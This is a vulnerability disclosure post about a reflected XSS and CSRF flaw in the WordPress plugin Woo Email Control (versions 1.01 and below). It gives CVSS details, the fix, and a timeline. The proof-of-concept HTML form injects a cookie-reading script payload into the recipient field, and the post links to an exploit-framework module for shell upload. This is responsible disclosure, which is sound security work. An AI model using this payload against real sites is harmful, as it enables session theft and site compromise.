---
layout: single
title: Woo Email Control <= 1.01 Reflected XSS Disclosure
date: 2016-07-19
categories:
  - security
  - websec
  - disclosure
tags:
  - wordpress
  - woo email control
  - reflected xss
excerpt: Due to a lack of encoding and CSRF mitigation in the `test_email` function found on line 106 of `classes/class-wooctrl.php`, it is possible to automate a request to the AJAX handler for the `wooctrl_send_test_email` action which will reflect the specified script back to the end user.
---
## Homepage
[https://wordpress.org/plugins/woo-email-control/](https://wordpress.org/plugins/woo-email-control/)

## Overview
Due to a lack of encoding and CSRF mitigation in the `test_email` function found on line 106 of `classes/class-wooctrl.php`, it is possible to automate a request to the AJAX handler for the `wooctrl_send_test_email` action which will reflect the specified script back to the end user.

## CVSS Score
4.8

## CVSS Vector
[(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C)](https://nvd.nist.gov/cvss.cfm?calculator&version=2&vector=(AV:N/AC:M/Au:N/C:P/I:P/A:N/E:F/RL:OF/RC:C))

## Versions Affected
1.01 and below

## Solution
Upgrade to version 1.02

## Proof of Concept
```xml
<form method="post" action="http://<target>/wp-admin/admin-ajax.php?action=wooctrl_send_test_email">
    <input type="text" name="email_class" value="WC_Email_Customer_New_Account">
    <input type="text" name="recipient" value="user@user.com<img src=x onerror=alert(document.cookie)>">
    <input type="submit" value="Test">
</form>
```

## WordPress Exploit Framework Module
[exploit/xss/reflected/woo\_email\_control\_reflected\_xss\_shell\_upload](https://github.com/rastating/wordpress-exploit-framework/blob/development/modules/exploit/xss/reflected/woo_email_control_reflected_xss_shell_upload.rb)

## WPVDB-ID
8559

## Disclosure Timeline
* **2016-07-18**: Identified vulnerability, contacted vendor with POC and a patch.
* **2016-07-18**: Vendor released patch.
